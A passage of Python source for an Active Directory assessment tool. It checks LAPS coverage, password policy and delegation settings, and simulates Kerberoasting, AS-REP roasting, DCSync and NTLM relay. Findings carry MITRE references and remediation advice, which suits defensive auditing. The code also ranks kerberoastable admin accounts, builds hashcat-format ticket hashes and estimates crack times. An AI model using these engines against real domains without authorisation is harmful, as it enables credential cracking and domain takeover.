                    affected_objects=[entry["name"]],
                    evidence=entry,
                    mitre_technique="T1558.001",
                    remediation="Replace unconstrained delegation with constrained or RBCD.",
                    confidence=0.97,
                    tags=["delegation", "unconstrained", "kerberos"],
                ))
        return entries

    def _check_laps(
        self, ldap_data: Dict[str, Any]
    ) -> Tuple[bool, List[str]]:
        """Check if LAPS is deployed and which computers have it."""
        laps_attr = "ms-Mcs-AdmPwdExpirationTime"
        laps_v2_attr = "msLAPS-PasswordExpirationTime"
        computers = ldap_data.get("computers", [])
        laps_computers: List[str] = []
        for comp in computers:
            has_laps = (
                comp.get(laps_attr) is not None
                or comp.get(laps_v2_attr) is not None
                or comp.get("has_laps", False)
            )
            if has_laps:
                laps_computers.append(comp.get("name", comp.get("hostname", "")))

        total = len(computers)
        laps_count = len(laps_computers)
        laps_enabled = laps_count > 0

        if total > 0 and laps_count < total * 0.5:
            coverage = (laps_count / total * 100) if total else 0
            self._findings.append(ADFinding(
                title=f"LAPS coverage is low: {coverage:.0f}% ({laps_count}/{total})",
                description=(
                    f"Only {laps_count} of {total} computers have LAPS configured. "
                    f"Computers without LAPS may share local admin passwords."
                ),
                severity=FindingSeverity.HIGH if coverage < 25 else FindingSeverity.MEDIUM,
                phase=AttackPhase.ENUMERATION,
                affected_objects=[f"{total - laps_count} computers without LAPS"],
                evidence={"total": total, "laps_count": laps_count, "coverage_pct": coverage},
                mitre_technique="T1078.003",
                remediation="Deploy LAPS (or Windows LAPS) to all domain-joined computers.",
                confidence=0.92,
                tags=["laps", "local-admin"],
            ))
        return (laps_enabled, laps_computers)

    def _check_admin_sd_holder(
        self, ldap_data: Dict[str, Any]
    ) -> List[str]:
        """Check AdminSDHolder protected objects."""
        protected: List[str] = []
        for user in ldap_data.get("users", []):
            if user.get("admin_count", 0) == 1:
                protected.append(user.get("username", user.get("name", "")))
        # Flag orphaned adminCount=1
        orphaned = []
        admin_members: Set[str] = set()
        for grp in ldap_data.get("groups", []):
            if grp.get("name", "") in self.PRIVILEGED_GROUP_NAMES:
                for m in grp.get("members", []):
                    admin_members.add(m.lower())
        for name in protected:
            if name.lower() not in admin_members:
                orphaned.append(name)
        if orphaned:
            self._findings.append(ADFinding(
                title=f"{len(orphaned)} users have adminCount=1 but are not in privileged groups",
                description=(
                    f"These users retain AdminSDHolder protection (adminCount=1) despite "
                    f"no longer being in privileged groups. Their ACLs won't be reset, "
                    f"potentially leaving stale elevated permissions."
                ),
                severity=FindingSeverity.MEDIUM,
                phase=AttackPhase.ENUMERATION,
                affected_objects=orphaned[:50],
                evidence={"count": len(orphaned)},
                mitre_technique="T1078.002",
                remediation="Clear adminCount and reset ACL inheritance for orphaned accounts.",
                confidence=0.88,
                tags=["admin-sd-holder", "orphaned"],
            ))
        return protected

    def _check_machine_account_quota(
        self, ldap_data: Dict[str, Any]
    ) -> int:
        """Check ms-DS-MachineAccountQuota value."""
        quota = ldap_data.get("ms-DS-MachineAccountQuota", 10)
        if quota > 0:
            self._findings.append(ADFinding(
                title=f"MachineAccountQuota is {quota} (allows RBCD attacks)",
                description=(
                    f"ms-DS-MachineAccountQuota is set to {quota}, allowing any authenticated "
                    f"user to add up to {quota} computer accounts. This enables resource-based "
                    f"constrained delegation (RBCD) attacks."
                ),
                severity=FindingSeverity.HIGH,
                phase=AttackPhase.ENUMERATION,
                affected_objects=[self._domain],
                evidence={"quota": quota},
                mitre_technique="T1136.002",
                remediation="Set ms-DS-MachineAccountQuota to 0 and delegate machine joining explicitly.",
                confidence=0.97,
                tags=["maq", "rbcd", "computer-account"],
            ))
        return quota

    def _extract_password_policy(
        self, ldap_data: Dict[str, Any]
    ) -> Dict[str, Any]:
        """Extract domain password policy."""
        policy = ldap_data.get("password_policy", {})
        result: Dict[str, Any] = {
            "min_length": policy.get("min_length", 0),
            "history_count": policy.get("history_count", 0),
            "max_age_days": policy.get("max_age_days", 0),
            "min_age_days": policy.get("min_age_days", 0),
            "complexity_enabled": policy.get("complexity_enabled", False),
            "reversible_encryption": policy.get("reversible_encryption", False),
            "lockout_threshold": policy.get("lockout_threshold", 0),
            "lockout_duration_minutes": policy.get("lockout_duration_minutes", 0),
            "lockout_observation_minutes": policy.get("lockout_observation_minutes", 0),
            "fine_grained_policies": policy.get("fine_grained_policies", []),
        }
        # Flag weak password policies
        if result["min_length"] < 12:
            self._findings.append(ADFinding(
                title=f"Weak password policy: minimum length is {result['min_length']}",
                description=(
                    f"The domain password policy requires only {result['min_length']} "
                    f"characters minimum. Modern recommendations require at least 12-14."
                ),
                severity=FindingSeverity.HIGH if result["min_length"] < 8 else FindingSeverity.MEDIUM,
                phase=AttackPhase.ENUMERATION,
                affected_objects=[self._domain],
                evidence=result,
                mitre_technique="T1110",
                remediation="Increase minimum password length to 14+ characters.",
                confidence=0.95,
                tags=["password-policy", "weak"],
            ))
        if result["lockout_threshold"] == 0:
            self._findings.append(ADFinding(
                title="No account lockout policy configured",
                description=(
                    "The domain has no account lockout threshold, allowing unlimited "
                    "password guessing attempts without locking accounts."
                ),
                severity=FindingSeverity.HIGH,
                phase=AttackPhase.ENUMERATION,
                affected_objects=[self._domain],
                evidence=result,
                mitre_technique="T1110.003",
                remediation="Configure an account lockout threshold (e.g., 5-10 attempts).",
                confidence=0.97,
                tags=["password-policy", "lockout"],
            ))
        if result["reversible_encryption"]:
            self._findings.append(ADFinding(
                title="Reversible encryption enabled for password storage",
                description=(
                    "The domain stores passwords using reversible encryption, "
                    "equivalent to storing them in plaintext."
                ),
                severity=FindingSeverity.CRITICAL,
                phase=AttackPhase.ENUMERATION,
                affected_objects=[self._domain],
                evidence={"reversible_encryption": True},
                mitre_technique="T1003.006",
                remediation="Disable 'Store passwords using reversible encryption' and reset affected passwords.",
                confidence=0.99,
                tags=["password-policy", "reversible-encryption"],
            ))
        return result


# ════════════════════════════════════════════════════════════════════════════════
# KERBEROAST ENGINE
# ════════════════════════════════════════════════════════════════════════════════

class KerberoastEngine:
    """
    Kerberoasting attack simulation engine.

    Enumerates SPNs, formats TGS-REP hashes, and estimates crack times
    per cipher type.

    Usage:
        engine = KerberoastEngine("corp.local")
        spns = engine.enumerate_spns(ldap_users)
        for spn in spns:
            formatted = engine.format_tgs_rep(spn)
            est = engine.estimate_crack_time(spn)
    """

    # Hashcat hash-rate benchmarks (hashes/sec) per GPU tier
    CRACK_RATES: Dict[str, Dict[str, float]] = {
        "RC4_HMAC": {
            "low_gpu": 500_000_000.0,
            "mid_gpu": 2_500_000_000.0,
            "high_gpu": 15_000_000_000.0,
            "cloud_cluster": 100_000_000_000.0,
        },
        "AES128_CTS": {
            "low_gpu": 200_000.0,
            "mid_gpu": 1_200_000.0,
            "high_gpu": 5_000_000.0,
            "cloud_cluster": 50_000_000.0,
        },
        "AES256_CTS": {
            "low_gpu": 100_000.0,
            "mid_gpu": 600_000.0,
            "high_gpu": 2_500_000.0,
            "cloud_cluster": 25_000_000.0,
        },
    }

    # Password complexity space estimates
    CHARSET_SIZES: Dict[str, int] = {
        "numeric": 10,
        "lower_alpha": 26,
        "upper_alpha": 26,
        "mixed_alpha": 52,
        "alpha_numeric": 62,
        "full_printable": 95,
    }

    # Common SPN service classes indicating high-value targets
    HIGH_VALUE_SERVICES: Set[str] = {
        "MSSQLSvc", "MSSQL", "HTTP", "HTTPS", "exchangeMDB",
        "exchangeRFR", "exchangeAB", "SMTP", "IMAP", "POP",
        "FTP", "CIFS", "DNS", "LDAP", "GC", "HOST",
        "WSMAN", "RPCSS", "TERMSRV", "SIP", "MONGO",
    }

    # Hashcat mode for TGS-REP
    HASHCAT_MODES: Dict[EncryptionType, int] = {
        EncryptionType.RC4_HMAC: 13100,
        EncryptionType.AES128_CTS: 19600,
        EncryptionType.AES256_CTS: 19700,
    }

    def __init__(self, domain: str) -> None:
        self._lock = threading.RLock()
        self._domain = domain
        self._spn_entries: List[SPNEntry] = []
        self._findings: List[ADFinding] = []
        self._admin_users: Set[str] = set()
        logger.info("KerberoastEngine initialized for domain '%s'", domain)

    def set_admin_users(self, admins: Set[str]) -> None:
        """Set the list of known admin usernames for priority flagging."""
        with self._lock:
            self._admin_users = {a.lower() for a in admins}

    def enumerate_spns(
        self,
        users: List[Dict[str, Any]],
        include_disabled: bool = False,
    ) -> List[SPNEntry]:
        """
        Enumerate Service Principal Names from user objects.

        Args:
            users: List of user dictionaries from LDAP.
            include_disabled: Whether to include disabled accounts.

        Returns:
            List of SPNEntry objects for kerberoastable accounts.
        """
        with self._lock:
            self._spn_entries.clear()
            start = time.time()
            for user in users:
                spns = user.get("spns", [])
                if not spns:
                    continue
                enabled = user.get("enabled", True)
                if not enabled and not include_disabled:
                    continue

                username = user.get("username", "")
                uac = user.get("uac", 0)

                # Determine encryption type from supported enctypes
                enc_types = user.get("supported_enctypes", 0)
                if enc_types & 0x10:
                    enc = EncryptionType.AES256_CTS
                elif enc_types & 0x8:
                    enc = EncryptionType.AES128_CTS
                else:
                    enc = EncryptionType.RC4_HMAC

                # Determine delegation
                deleg = DelegationType.NONE
                if uac & 0x80000:
                    deleg = DelegationType.UNCONSTRAINED
                elif uac & 0x1000000:
                    deleg = DelegationType.CONSTRAINED
                elif user.get("msDS-AllowedToActOnBehalfOfOtherIdentity"):
                    deleg = DelegationType.RESOURCE_BASED

                is_admin = (
                    username.lower() in self._admin_users
                    or user.get("admin_count", 0) == 1
                )

                for spn_str in spns:
                    entry = SPNEntry(
                        spn=spn_str,
                        username=username,
                        domain=user.get("domain", self._domain),
                        encryption_type=enc,
                        account_dn=user.get("dn", ""),
                        password_last_set=user.get("password_last_set", 0.0),
                        is_admin=is_admin,
                        is_enabled=enabled,
                        delegation_type=deleg,
                        description=user.get("description", ""),
                    )
                    entry.estimated_crack_seconds = self._estimate_crack_seconds(
                        entry.encryption_type
                    )
                    self._spn_entries.append(entry)

            # Sort: admin accounts first, then by encryption weakness
            enc_priority = {
                EncryptionType.RC4_HMAC: 0,
                EncryptionType.DES_CBC_MD5: 1,
                EncryptionType.DES_CBC_CRC: 2,
                EncryptionType.AES128_CTS: 3,
                EncryptionType.AES256_CTS: 4,
            }
            self._spn_entries.sort(
                key=lambda e: (
                    0 if e.is_admin else 1,
                    enc_priority.get(e.encryption_type, 5),
                )
            )

            # Generate findings
            self._generate_kerberoast_findings()

            elapsed = time.time() - start
            logger.info(
                "Enumerated %d SPNs from %d users in %.3fs",
                len(self._spn_entries), len(users), elapsed,
            )
            return list(self._spn_entries)

    def format_tgs_rep(self, entry: SPNEntry, ticket_data: str = "") -> str:
        """
        Format a TGS-REP hash in hashcat/john-compatible format.

        Args:
            entry: SPNEntry to format.
            ticket_data: Raw ticket hex (or simulated).

        Returns:
            Formatted hash string for offline cracking tools.
        """
        if not ticket_data:
            # Generate simulated ticket data for demonstration
            seed = f"{entry.spn}:{entry.username}:{entry.domain}:{time.time()}"
            ticket_data = hashlib.sha256(seed.encode()).hexdigest() * 8

        if entry.encryption_type == EncryptionType.RC4_HMAC:
            # $krb5tgs$23$*user$realm$spn*$checksum$encrypted
            checksum = ticket_data[:32]
            encrypted = ticket_data[32:]
            return (
                f"$krb5tgs$23$*{entry.username}${entry.domain}"
                f"${entry.spn}*${checksum}${encrypted}"
            )
        elif entry.encryption_type == EncryptionType.AES256_CTS:
            # $krb5tgs$18$user$realm$checksum$encrypted
            checksum = ticket_data[:24]
            encrypted = ticket_data[24:]
            return (
                f"$krb5tgs$18${entry.username}${entry.domain}"
                f"${checksum}${encrypted}"
            )
        elif entry.encryption_type == EncryptionType.AES128_CTS:
            checksum = ticket_data[:24]
            encrypted = ticket_data[24:]
            return (
                f"$krb5tgs$17${entry.username}${entry.domain}"
                f"${checksum}${encrypted}"
            )
        else:
            return f"$krb5tgs$0${entry.username}${entry.domain}${ticket_data}"

    def estimate_crack_time(
        self,
        entry: SPNEntry,
        password_length: int = 8,
        charset: str = "full_printable",
        gpu_tier: str = "mid_gpu",
    ) -> Dict[str, Any]:
        """
        Estimate time to crack a TGS-REP hash.

        Args:
            entry: SPNEntry with encryption type info.
            password_length: Assumed password length.
            charset: Character set name.
            gpu_tier: GPU tier for rate lookup.

        Returns:
            Dictionary with crack time estimates.
        """
        enc_name = entry.encryption_type.name
        rates = self.CRACK_RATES.get(enc_name, self.CRACK_RATES["AES256_CTS"])
        rate = rates.get(gpu_tier, rates["mid_gpu"])

        cs = self.CHARSET_SIZES.get(charset, 95)
        keyspace = cs ** password_length
        seconds = keyspace / rate if rate > 0 else float("inf")

        # Estimate with common password lists
        rockyou_size = 14_344_391
        rockyou_seconds = rockyou_size / rate if rate > 0 else float("inf")

        # Estimate with rules (x300 multiplier typical)
        rules_seconds = (rockyou_size * 300) / rate if rate > 0 else float("inf")

        return {
            "encryption_type": enc_name,
            "gpu_tier": gpu_tier,
            "hash_rate_per_sec": rate,
            "password_length": password_length,
            "charset": charset,
            "charset_size": cs,
            "keyspace": keyspace,
            "brute_force_seconds": seconds,
            "brute_force_human": self._humanize_time(seconds),
            "rockyou_seconds": rockyou_seconds,
            "rockyou_human": self._humanize_time(rockyou_seconds),
            "rules_seconds": rules_seconds,
            "rules_human": self._humanize_time(rules_seconds),
            "hashcat_mode": self.HASHCAT_MODES.get(entry.encryption_type, 13100),
            "crackable_in_24h": seconds < 86400,
            "crackable_in_7d": seconds < 604800,
        }

    def get_findings(self) -> List[ADFinding]:
        """Return findings generated during kerberoasting."""
        with self._lock:
            return list(self._findings)

    def get_spn_entries(self) -> List[SPNEntry]:
        """Return enumerated SPN entries."""
        with self._lock:
            return list(self._spn_entries)

    def get_statistics(self) -> Dict[str, Any]:
        """Return kerberoast statistics."""
        with self._lock:
            total = len(self._spn_entries)
            rc4_count = sum(
                1 for e in self._spn_entries
                if e.encryption_type == EncryptionType.RC4_HMAC
            )
            aes_count = total - rc4_count
            admin_count = sum(1 for e in self._spn_entries if e.is_admin)
            unique_users = len({e.username for e in self._spn_entries})
            services: Dict[str, int] = defaultdict(int)
            for e in self._spn_entries:
                services[e.service_class] += 1
            return {
                "total_spns": total,
                "unique_users": unique_users,
                "rc4_count": rc4_count,
                "aes_count": aes_count,
                "admin_spns": admin_count,
                "service_distribution": dict(services),
            }

    def _estimate_crack_seconds(self, enc: EncryptionType) -> float:
        """Quick crack estimate for sorting (assumes mid_gpu, 8-char password)."""
        enc_name = enc.name
        rates = self.CRACK_RATES.get(enc_name, self.CRACK_RATES["AES256_CTS"])
        rate = rates.get("mid_gpu", 600_000.0)
        keyspace = 95 ** 8
        return keyspace / rate if rate > 0 else float("inf")

    def _generate_kerberoast_findings(self) -> None:
        """Generate findings from enumerated SPNs."""
        self._findings.clear()
        if not self._spn_entries:
            return

        rc4_entries = [
            e for e in self._spn_entries
            if e.encryption_type == EncryptionType.RC4_HMAC
        ]
        admin_entries = [e for e in self._spn_entries if e.is_admin]

        if rc4_entries:
            self._findings.append(ADFinding(
                title=f"{len(rc4_entries)} SPNs use RC4 encryption (easily crackable)",
                description=(
                    f"{len(rc4_entries)} service accounts use RC4-HMAC encryption for "
                    f"Kerberos tickets. RC4 hashes can be cracked at ~2.5 billion/sec "
                    f"on a mid-range GPU."
                ),
                severity=FindingSeverity.HIGH,
                phase=AttackPhase.CREDENTIAL_HARVEST,
                affected_objects=[e.username for e in rc4_entries[:20]],
                evidence={
                    "rc4_count": len(rc4_entries),
                    "sample_spns": [e.spn for e in rc4_entries[:10]],
                },
                mitre_technique="T1558.003",
                remediation="Configure AES256 encryption for all service accounts; disable RC4.",
                confidence=0.95,
                tags=["kerberoast", "rc4", "weak-encryption"],
            ))

        if admin_entries:
            self._findings.append(ADFinding(
                title=f"{len(admin_entries)} admin accounts have SPNs (Kerberoastable admins)",
                description=(
                    f"{len(admin_entries)} accounts with administrative privileges have "
                    f"SPNs registered. Kerberoasting these could yield domain admin credentials."
                ),
                severity=FindingSeverity.CRITICAL,
                phase=AttackPhase.CREDENTIAL_HARVEST,
                affected_objects=[e.username for e in admin_entries],
                evidence={
                    "admin_spns": [
                        {"user": e.username, "spn": e.spn, "enc": e.encryption_type.name}
                        for e in admin_entries
                    ],
                },
                mitre_technique="T1558.003",
                remediation="Remove SPNs from admin accounts or use gMSA with AES256.",
                confidence=0.98,
                tags=["kerberoast", "admin", "critical-path"],
            ))

        # Flag old passwords
        old_pwd_entries = [
            e for e in self._spn_entries
            if e.password_last_set > 0
            and (time.time() - e.password_last_set) > 180 * 86400
        ]
        if old_pwd_entries:
            self._findings.append(ADFinding(
                title=f"{len(old_pwd_entries)} kerberoastable accounts have passwords older than 180 days",
                description=(
                    f"Service accounts with old passwords are high-priority Kerberoast "
                    f"targets since the passwords are more likely to be weak or unchanged "
                    f"from initial deployment."
                ),
                severity=FindingSeverity.MEDIUM,
                phase=AttackPhase.CREDENTIAL_HARVEST,
                affected_objects=[e.username for e in old_pwd_entries[:20]],
                evidence={
                    "count": len(old_pwd_entries),
                    "oldest_days": max(
                        int((time.time() - e.password_last_set) / 86400)
                        for e in old_pwd_entries
                    ),
                },
                mitre_technique="T1558.003",
                remediation="Rotate all service account passwords; implement gMSA.",
                confidence=0.88,
                tags=["kerberoast", "old-password"],
            ))

    @staticmethod
    def _humanize_time(seconds: float) -> str:
        """Convert seconds to human-readable time string."""
        if seconds == float("inf"):
            return "effectively infinite"
        if seconds < 0.001:
            return "instant"
        if seconds < 1:
            return f"{seconds * 1000:.1f} milliseconds"
        if seconds < 60:
            return f"{seconds:.1f} seconds"
        if seconds < 3600:
            return f"{seconds / 60:.1f} minutes"
        if seconds < 86400:
            return f"{seconds / 3600:.1f} hours"
        if seconds < 86400 * 365:
            return f"{seconds / 86400:.1f} days"
        if seconds < 86400 * 365 * 1000:
            return f"{seconds / (86400 * 365):.1f} years"
        if seconds < 86400 * 365 * 1_000_000:
            return f"{seconds / (86400 * 365 * 1000):.1f} thousand years"
        return f"{seconds / (86400 * 365 * 1_000_000):.1e} million years"


# ════════════════════════════════════════════════════════════════════════════════
# AS-REP ROASTER
# ════════════════════════════════════════════════════════════════════════════════

class ASREPRoaster:
    """
    AS-REP Roasting attack simulation engine.

    Identifies accounts that do not require Kerberos pre-authentication
    and can be attacked offline.

    Usage:
        roaster = ASREPRoaster("corp.local")
        targets = roaster.find_targets(ldap_users)
        for t in targets:
            h = roaster.format_asrep_hash(t)
    """

    # Hashcat modes for AS-REP
    HASHCAT_MODES: Dict[EncryptionType, int] = {
        EncryptionType.RC4_HMAC: 18200,
        EncryptionType.AES256_CTS: 19900,
        EncryptionType.AES128_CTS: 19800,
    }

    # UF_DONT_REQUIRE_PREAUTH = 0x400000
    DONT_REQUIRE_PREAUTH: int = 0x400000

    # Crack rates (same as Kerberoast but AS-REP hashes are slightly faster)
    CRACK_RATES: Dict[str, float] = {
        "RC4_HMAC": 3_000_000_000.0,
        "AES128_CTS": 1_500_000.0,
        "AES256_CTS": 750_000.0,
    }

    def __init__(self, domain: str) -> None:
        self._lock = threading.RLock()
        self._domain = domain
        self._targets: List[Dict[str, Any]] = []
        self._findings: List[ADFinding] = []
        logger.info("ASREPRoaster initialized for domain '%s'", domain)

    def find_targets(
        self,
        users: List[Dict[str, Any]],
        include_disabled: bool = False,
    ) -> List[Dict[str, Any]]:
        """
        Find accounts vulnerable to AS-REP roasting.

        Args:
            users: List of user dictionaries from LDAP.
            include_disabled: Whether to include disabled accounts.

        Returns:
            List of vulnerable account dictionaries.
        """
        with self._lock:
            self._targets.clear()
            self._findings.clear()
            start = time.time()

            for user in users:
                uac = user.get("uac", 0)
                if not (uac & self.DONT_REQUIRE_PREAUTH):
                    continue
                enabled = user.get("enabled", True)
                if not enabled and not include_disabled:
                    continue

                enc_types = user.get("supported_enctypes", 0)
                if enc_types & 0x10:
                    enc = EncryptionType.AES256_CTS
                elif enc_types & 0x8:
                    enc = EncryptionType.AES128_CTS
                else:
                    enc = EncryptionType.RC4_HMAC

                target: Dict[str, Any] = {
                    "username": user.get("username", ""),
                    "dn": user.get("dn", ""),
                    "domain": user.get("domain", self._domain),
                    "enabled": enabled,
                    "encryption_type": enc.name,
                    "admin_count": user.get("admin_count", 0),
                    "password_last_set": user.get("password_last_set", 0.0),
                    "last_logon": user.get("last_logon", 0.0),
                    "description": user.get("description", ""),
                    "member_of": user.get("member_of", []),
                    "is_privileged": user.get("admin_count", 0) == 1,
                }
                self._targets.append(target)

            # Generate findings
            self._generate_asrep_findings()

            elapsed = time.time() - start
            logger.info(
                "Found %d AS-REP roastable accounts in %.3fs",
                len(self._targets), elapsed,
            )
            return list(self._targets)

    def format_asrep_hash(
        self, target: Dict[str, Any], as_rep_data: str = ""
    ) -> str:
        """
        Format an AS-REP hash for offline cracking.

        Args:
            target: Target account dictionary.
            as_rep_data: Raw AS-REP hex data (or simulated).

        Returns:
            Hashcat-compatible AS-REP hash string.
        """
        username = target.get("username", "unknown")
        domain = target.get("domain", self._domain)
        enc = target.get("encryption_type", "RC4_HMAC")

        if not as_rep_data:
            seed = f"{username}:{domain}:{time.time()}"
            as_rep_data = hashlib.sha256(seed.encode()).hexdigest() * 8

        if enc == "RC4_HMAC":
            checksum = as_rep_data[:32]
            encrypted = as_rep_data[32:]
            return f"$krb5asrep$23${username}@{domain}:{checksum}${encrypted}"
        elif enc == "AES256_CTS":
            checksum = as_rep_data[:24]
            encrypted = as_rep_data[24:]
            return f"$krb5asrep$18${username}@{domain}:{checksum}${encrypted}"
        elif enc == "AES128_CTS":
            checksum = as_rep_data[:24]
            encrypted = as_rep_data[24:]
            return f"$krb5asrep$17${username}@{domain}:{checksum}${encrypted}"
        return f"$krb5asrep$0${username}@{domain}:{as_rep_data}"

    def estimate_crack_time(
        self, target: Dict[str, Any], password_length: int = 8
    ) -> Dict[str, Any]:
        """Estimate time to crack an AS-REP hash."""
        enc = target.get("encryption_type", "RC4_HMAC")
        rate = self.CRACK_RATES.get(enc, 750_000.0)
        keyspace = 95 ** password_length
        seconds = keyspace / rate if rate > 0 else float("inf")
        return {
            "encryption_type": enc,
            "hash_rate": rate,
            "keyspace": keyspace,
            "brute_force_seconds": seconds,
            "crackable_in_24h": seconds < 86400,
            "hashcat_mode": self.HASHCAT_MODES.get(
                EncryptionType[enc], 18200
            ),
        }

    def get_findings(self) -> List[ADFinding]:
        """Return AS-REP roasting findings."""
        with self._lock:
            return list(self._findings)

    def get_statistics(self) -> Dict[str, Any]:
        """Return AS-REP roasting statistics."""
        with self._lock:
            total = len(self._targets)
            privileged = sum(1 for t in self._targets if t.get("is_privileged"))
            enabled = sum(1 for t in self._targets if t.get("enabled"))
            rc4 = sum(
                1 for t in self._targets
                if t.get("encryption_type") == "RC4_HMAC"
            )
            return {
                "total_targets": total,
                "privileged_targets": privileged,
                "enabled_targets": enabled,
                "rc4_targets": rc4,
                "aes_targets": total - rc4,
            }

    def _generate_asrep_findings(self) -> None:
        """Generate findings from AS-REP roastable accounts."""
        if not self._targets:
            return

        self._findings.append(ADFinding(
            title=f"{len(self._targets)} accounts do not require Kerberos pre-authentication",
            description=(
                f"{len(self._targets)} accounts have 'Do not require Kerberos "
                f"pre-authentication' set, allowing AS-REP roasting attacks "
                f"without any authentication."
            ),
            severity=FindingSeverity.HIGH,
            phase=AttackPhase.CREDENTIAL_HARVEST,
            affected_objects=[t["username"] for t in self._targets[:20]],
            evidence={
                "count": len(self._targets),
                "accounts": [t["username"] for t in self._targets],
            },
            mitre_technique="T1558.004",
            remediation="Enable Kerberos pre-authentication for all accounts unless technically required.",
            confidence=0.97,
            tags=["asrep-roast", "pre-auth"],
        ))

        privileged = [t for t in self._targets if t.get("is_privileged")]
        if privileged:
            self._findings.append(ADFinding(
                title=f"{len(privileged)} privileged accounts are AS-REP roastable",
                description=(
                    f"{len(privileged)} accounts with adminCount=1 do not require "
                    f"Kerberos pre-authentication. These are critical targets."
                ),
                severity=FindingSeverity.CRITICAL,
                phase=AttackPhase.CREDENTIAL_HARVEST,
                affected_objects=[t["username"] for t in privileged],
                evidence={"privileged_accounts": [t["username"] for t in privileged]},
                mitre_technique="T1558.004",
                remediation="Immediately enable pre-authentication for privileged accounts.",
                confidence=0.99,
                tags=["asrep-roast", "privileged", "critical-path"],
            ))


# ════════════════════════════════════════════════════════════════════════════════
# DCSYNC SIMULATOR
# ════════════════════════════════════════════════════════════════════════════════

class DCsyncSimulator:
    """
    DCSync attack path simulator.

    Identifies accounts with replication privileges (DS-Replication-Get-Changes
    and DS-Replication-Get-Changes-All) that could perform DCSync.

    Usage:
        sim = DCsyncSimulator("corp.local")
        paths = sim.find_dcsync_paths(acl_data, groups)
    """

    # Required rights GUIDs for DCSync
    REPLICATION_GUIDS: Dict[str, str] = {
        "DS-Replication-Get-Changes": "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2",
        "DS-Replication-Get-Changes-All": "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2",
        "DS-Replication-Get-Changes-In-Filtered-Set": "89e95b76-444d-4c62-991a-0facbeda640c",
    }

    # Default accounts with replication rights
    DEFAULT_REPLICATION_ACCOUNTS: Set[str] = {
        "Domain Controllers",
        "Enterprise Domain Controllers",
        "Administrators",
        "Domain Admins",
        "Enterprise Admins",
    }

    def __init__(self, domain: str) -> None:
        self._lock = threading.RLock()
        self._domain = domain
        self._dcsync_principals: List[Dict[str, Any]] = []
        self._findings: List[ADFinding] = []
        logger.info("DCsyncSimulator initialized for domain '%s'", domain)

    def find_dcsync_paths(
        self,
        acl_data: List[Dict[str, Any]],
        group_memberships: Dict[str, List[str]],
    ) -> List[Dict[str, Any]]:
        """
        Find principals with DCSync capabilities.

        Args:
            acl_data: List of ACE entries on the domain object.
            group_memberships: Mapping of group name to member list.

        Returns:
            List of principals with DCSync rights.
        """
        with self._lock:
            self._dcsync_principals.clear()
            self._findings.clear()
            start = time.time()

            # Track who has which replication right
            repl_get_changes: Set[str] = set()
            repl_get_changes_all: Set[str] = set()

            get_changes_guid = self.REPLICATION_GUIDS[
                "DS-Replication-Get-Changes"
            ].lower()
            get_changes_all_guid = self.REPLICATION_GUIDS[
                "DS-Replication-Get-Changes-All"
            ].lower()

            for ace in acl_data:
                principal = ace.get("principal", "")
                object_type = ace.get("object_type", "").lower()
                access_mask = ace.get("access_mask", 0)
                ace_type = ace.get("ace_type", "")

                # Check for extended rights
                if "ACCESS_ALLOWED" not in ace_type.upper():
                    continue

                if object_type == get_changes_guid:
                    repl_get_changes.add(principal)
                elif object_type == get_changes_all_guid:
                    repl_get_changes_all.add(principal)
                elif access_mask & 0x100:  # DS_CONTROL_ACCESS (all extended rights)
                    if not object_type:  # Blank = all extended rights
                        repl_get_changes.add(principal)
                        repl_get_changes_all.add(principal)

            # Principals with BOTH rights can DCSync
            dcsync_capable = repl_get_changes & repl_get_changes_all

            for principal in dcsync_capable:
                is_default = principal in self.DEFAULT_REPLICATION_ACCOUNTS
                # Resolve group members
                effective_users: List[str] = []
                if principal in group_memberships:
                    effective_users = group_memberships[principal]

                entry: Dict[str, Any] = {
                    "principal": principal,
                    "is_default": is_default,
                    "has_get_changes": True,
                    "has_get_changes_all": True,
                    "effective_users": effective_users,
                    "risk": "expected" if is_default else "dangerous",
                }
                self._dcsync_principals.append(entry)

            # Find principals with only one right (partial path)
            partial_get_changes = repl_get_changes - dcsync_capable
            partial_get_changes_all = repl_get_changes_all - dcsync_capable
            for principal in partial_get_changes:
                self._dcsync_principals.append({
                    "principal": principal,
                    "is_default": principal in self.DEFAULT_REPLICATION_ACCOUNTS,
                    "has_get_changes": True,
                    "has_get_changes_all": False,
                    "effective_users": group_memberships.get(principal, []),
                    "risk": "partial",
                })
            for principal in partial_get_changes_all:
                self._dcsync_principals.append({
                    "principal": principal,
                    "is_default": principal in self.DEFAULT_REPLICATION_ACCOUNTS,
                    "has_get_changes": False,
                    "has_get_changes_all": True,
                    "effective_users": group_memberships.get(principal, []),
                    "risk": "partial",
                })

            self._generate_dcsync_findings(dcsync_capable)

            elapsed = time.time() - start
            logger.info(
                "Found %d DCSync-capable principals in %.3fs",
                len(dcsync_capable), elapsed,
            )
            return list(self._dcsync_principals)

    def get_findings(self) -> List[ADFinding]:
        """Return DCSync-related findings."""
        with self._lock:
            return list(self._findings)

    def _generate_dcsync_findings(self, dcsync_capable: Set[str]) -> None:
        """Generate findings for DCSync-capable principals."""
        non_default = [
            p for p in dcsync_capable
            if p not in self.DEFAULT_REPLICATION_ACCOUNTS
        ]
        if non_default:
            self._findings.append(ADFinding(
                title=f"{len(non_default)} non-default principals have DCSync rights",
                description=(
                    f"The following non-default principals have both "
                    f"DS-Replication-Get-Changes and DS-Replication-Get-Changes-All "
                    f"rights on the domain object, enabling DCSync attacks: "
                    f"{', '.join(non_default[:10])}"
                ),
                severity=FindingSeverity.CRITICAL,
                phase=AttackPhase.DOMAIN_DOMINANCE,
                affected_objects=list(non_default),
                evidence={
                    "principals": list(non_default),
                    "required_guids": self.REPLICATION_GUIDS,
                },
                mitre_technique="T1003.006",
                remediation="Remove replication rights from non-default principals immediately.",
                confidence=0.99,
                tags=["dcsync", "replication", "domain-dominance"],
            ))


# ════════════════════════════════════════════════════════════════════════════════
# NTLM RELAY SIMULATOR
# ════════════════════════════════════════════════════════════════════════════════

class NTLMRelaySimulator:
    """
    NTLM relay attack simulation engine.

    Identifies relay targets by checking SMB signing, EPA status,
    and available services.

    Usage:
        sim = NTLMRelaySimulator("corp.local")
        targets = sim.find_relay_targets(hosts)
        viable = sim.get_viable_targets()
    """

    # Default ports per protocol for relay
    RELAY_PROTOCOLS: Dict[str, List[int]] = {
        "SMB": [445, 139],
        "HTTP": [80, 8080, 8443],
        "HTTPS": [443],
        "LDAP": [389],
        "LDAPS": [636],
        "MSSQL": [1433],
        "IMAP": [143, 993],
        "SMTP": [25, 587],
        "RPC": [135],
